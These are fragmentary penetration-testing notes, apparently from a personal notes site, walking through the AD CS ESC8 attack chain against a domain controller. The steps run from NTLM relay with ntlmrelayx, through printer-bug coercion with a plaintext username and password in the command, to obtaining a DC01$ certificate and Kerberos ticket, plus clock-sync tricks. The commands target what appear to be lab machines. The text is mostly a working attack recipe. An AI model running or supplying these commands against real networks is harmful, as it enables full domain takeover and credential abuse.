pphttps://adminions.ca/books/adcs

**Attack Chain: ESC8 to Compromise DC Account**
 Execution steps
1. **Identify Vulnerability:** Enumerate AD CS for ESC8 misconfigurations.
    
2. **Setup NTLM Relay:** Start ntlmrelayx.py targeting an AD CS enrollment page.
    
3. **Force Authentication:** Exploit printer bug (e.g., using SpoolSample or similar) to coerce DC01 to authenticate to ntlmrelayx.
    
4. **Obtain Certificate:** ntlmrelayx will relay the authentication and obtain a signed certificate for the DC01$ account.
    
5. **Get TGT:** Convert the obtained certificate to .pfx, then use gettgtpkinit with the .pfx to get a TGT for DC01$.
    
6. **Lateral Movement:** Use the DC01$ TGT for high-privileged lateral movement within the domain.
----
### ESC8 Template Overview
...
```shell-session
$ impacket-ntlmrelayx -t http://<enrollment-server-ip>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```
## `--template` value
...
# Pass the Certificate certified-preowned esc8
...
```shell-session
python3 printerbug.py ad.someorg.local/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```
...
```shell-session
$ python3 gettgtpkinit.py -cert-pfx DC01$.pfx -dc-ip [TARGET-DC] 'ad.someorg.local/dc01$' /tmp/dc.ccache
...
using exegol's faketime trick
```
faketime "$(rdate -n $DC_IP -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
```

you must run on privileged container or change host's clock
because containers vy default are not allowed to change clock
`sudo ntpdate -s DC01.tombwatcher.htb`


```
    ~/.oh-my-zsh/custom/plugins  on    master ▓▒░                                               ░▒▓ took 6s      
❯ sudo ntpdate -u 10.10.11.72  
2025-09-26 21:20:21.527620 (+0300) +14406.557889 +/- 0.432361 10.10.11.72 s1 no-leap  
CLOCK: time stepped by 14406.557889
```
sudo rdate -n [IP ADDRESS] (may not work))

sudo ntpdate [IP ADDRESS] ( may not work)
